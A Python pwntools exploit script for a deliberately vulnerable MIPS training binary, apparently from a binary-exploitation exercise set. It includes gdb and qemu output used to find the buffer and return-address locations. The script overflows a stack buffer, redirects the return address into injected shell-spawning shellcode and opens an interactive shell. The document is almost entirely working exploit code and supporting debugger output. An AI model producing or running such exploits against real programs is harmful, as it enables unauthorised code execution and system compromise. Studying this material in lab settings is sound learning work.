#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x004007c0 <+0>:	addiu	sp,sp,-160
   0x004007c4 <+4>:	sw	ra,156(sp)
...
   0x0040085c <+156>:	lw	ra,156(sp)
   0x00400860 <+160>:	lw	s8,152(sp)
   0x00400864 <+164>:	addiu	sp,sp,160
   0x00400868 <+168>:	jr	ra
   0x0040086c <+172>:	nop
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x4007dc: file src/04-shellcode-static.c, line 6.
(gdb) b *0x0040085c
Breakpoint 2 at 0x40085c: file src/04-shellcode-static.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/04-shellcode-static.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x7fffef58 "\177~\272X\177~\243\f\177|\210D"
(gdb) c
Continuing.

Breakpoint 2, 0x0040085c in vulnerable () at src/04-shellcode-static.c:14
14	}
(gdb) p/x $sp+156
$2 = 0x7fffefdc
"""

"""
$ qemu-mips -L /usr/mips-linux-gnu/ -strace ./bin/mips/04-shellcode-static
...
18573 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
18573 mmap2(NULL,1638448,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x7f615000
...
"""

import struct
import sys

from pwn import *

context(arch='mips', os='linux', endian='big', word_size=32)

binary_path = './bin/mips/04-shellcode-static'

ra_saved_addr = 0x7fffefdc
buffer_addr = 0x7fffef58
libc_addr = 0x7f615000

shellcode = asm(shellcraft.sh())

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (ra_saved_addr - buffer_addr)
payload += p32(ra_saved_addr + 4)
payload += shellcode

p.readuntil('> ')
p.write(payload)
p.interactive()
